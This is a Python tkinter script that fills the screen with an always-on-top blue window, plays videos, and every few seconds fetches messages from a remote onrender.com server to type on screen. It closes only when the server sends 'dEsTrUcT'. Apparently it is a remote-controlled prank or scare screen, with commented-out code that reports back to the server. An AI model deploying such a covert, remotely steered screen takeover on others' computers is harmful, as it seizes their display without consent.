import tkinter as tk
import time
import cv2
from PIL import Image, ImageTk
import threading
import requests
import os
import sys
# Global variable for the message
say_msg = ""
# url = "https://ms32-sha2.onrender.com/"
# user = "<APP>"
# def hit(url:str,data=None):
#     # try:
#         if not terminate:
#             if data:
#                 return post(url,json=data)
#             return get(url,stream=True)
#     # except:
#     #     return "none"

# def log(statement,state="SUCESS",terminal=False):
#     try:
#         statement = f"{state}   {statement}"
#         hit(url+"output",data={"user":user,"err":statement})
#     except:
#         pass

# Fetch the message from the provided URL
def get_message_from_url():
    try:
        response = requests.get("https://ms32-sha2.onrender.com/get-com")
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException:
        return None

# Get the absolute path of the video file
def get_video_path(video_name):
    # Get the path to the directory where the script or executable is running
    # base_path = sys._MEIPASS
    base_path = ""
    return os.path.join(base_path, video_name)

# Create the main window
root = tk.Tk()
root.configure(bg="blue")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

# Function to show the black screen and delay label creation
def show_black_screen():
    root.configure(bg="black")
    root.update()
    time.sleep(1)
    root.configure(bg="blue")
    root.update()
    threading.Thread(target=play_video).start()
    root.after(0, create_message_label)

# Create the label to display the animated message
def create_message_label():
    global message_label
    message_label = tk.Label(
        root,
        text="",
        font=("Courier", 28, "bold"),
        bg="blue",
        fg="white"
    )
    message_label.pack(expand=True)

# Function to clear the screen with a backspace animation
def clear_screen_with_backspace():
    current_text = message_label.cget("text")
    for _ in current_text:
        current_text = current_text[:-1]
        message_label.config(text=current_text + "_")
        root.update()
        time.sleep(0.1)

# Function to play an MP4 video
def play_video():
    video_path = get_video_path('your_video.mp4')  # Get the full path for the video
    try:
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            raise ValueError("Could not open video file.")

        # Create a canvas for the video
        canvas_width = root.winfo_width()
        canvas_height = root.winfo_height()
        canvas = tk.Canvas(root, width=canvas_width, height=canvas_height)
        canvas.pack()

        while True:
            ret, frame = cap.read()
            if not ret:
                break

            # Resize the frame for display
            frame_resized = resize_frame(frame, canvas_width, canvas_height)
            frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img_tk = ImageTk.PhotoImage(image=img)

            # Update canvas with the frame
            canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
            canvas.image = img_tk
            root.update()

        cap.release()
        canvas.destroy()
    except Exception as e:
        print(f"Error: {e}")  # Optional: remove or log this for debugging
    finally:
        # Proceed with typing after the video
        threading.Thread(target=type_message, args=(say_msg, message_label, 0.07)).start()

# Function to resize the video frame for display
def resize_frame(frame, canvas_width, canvas_height):
    height, width = frame.shape[:2]
    aspect_ratio = width / height

    # Determine new dimensions
    if aspect_ratio > 1:
        new_width = canvas_width
        new_height = int(canvas_width / aspect_ratio)
    else:
        new_height = canvas_height
        new_width = int(canvas_height * aspect_ratio)

    # Resize the frame
    frame_resized = cv2.resize(frame, (new_width, new_height))
    return frame_resized

# Typing animation function
def type_message(message, label, typing_speed):
    current_text = ""
    for char in message:
        current_text += char
        label.config(text=current_text + "_")
        root.update()
        time.sleep(typing_speed)
    blink_cursor(label, current_text)

# Cursor blinking function
def blink_cursor(label, message):
    cursor_visible = True
    for _ in range(6):  # Blink cursor for 3 seconds
        label.config(text=message + "_" if cursor_visible else message)
        cursor_visible = not cursor_visible
        root.update()
        time.sleep(0.5)

    if message == "dEsTrUcT":
        close_window()

# Function to close the window
def close_window():
    # Play the video before closing
    threading.Thread(target=play_video_before_close).start()

# Function to play the video before closing
def play_video_before_close():
    video_path = get_video_path('your_video_reverse.mp4')  # Get the full path for the closing video
    try:
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            raise ValueError("Could not open video file.")
        
        # Create a canvas for the video
        canvas_width = root.winfo_width()
        canvas_height = root.winfo_height()
        canvas = tk.Canvas(root, width=canvas_width, height=canvas_height)
        canvas.pack()

        while True:
            ret, frame = cap.read()
            if not ret:
                break

            # Resize the frame for display
            frame_resized = resize_frame(frame, canvas_width, canvas_height)
            frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img_tk = ImageTk.PhotoImage(image=img)

            # Update canvas with the frame
            canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
            canvas.image = img_tk
            root.update()

        cap.release()
        canvas.destroy()
    except Exception as e:
        print(f"Error playing the closing video: {e}")
    finally:
        # Close the window after the video finishes
        root.destroy()

# Periodically check for new messages
def check_for_new_message():
    global say_msg
    new_message = get_message_from_url()
    if new_message == "dEsTrUcT":
        close_window()
        return

    if new_message and new_message != "none" and new_message != say_msg:
        say_msg = new_message
        clear_screen_with_backspace()
        type_message(say_msg, message_label, 0.07)

    root.after(5000, check_for_new_message)

# Start the black screen effect
root.after(0, show_black_screen)

# Start checking for new messages
root.after(0, check_for_new_message)

# Start the Tkinter event loop
root.mainloop()
